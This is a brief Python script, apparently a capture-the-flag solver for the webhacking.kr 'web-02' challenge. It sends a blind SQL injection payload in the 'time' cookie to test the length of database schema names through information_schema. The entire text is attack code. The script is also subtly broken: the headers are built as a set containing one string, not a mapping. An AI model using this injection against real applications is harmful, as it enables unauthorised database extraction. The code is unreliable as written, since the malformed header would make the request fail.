import requests

query = '1 and length((SELECT schema_name FROM information_schema.schemata LIMIT 1,1)) > 5'
url = 'https://webhacking.kr/challenge/web-02/'
header = {'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'}
cookie = {'time':query}
print(requests.get(url=url, headers=header, cookies=cookie))
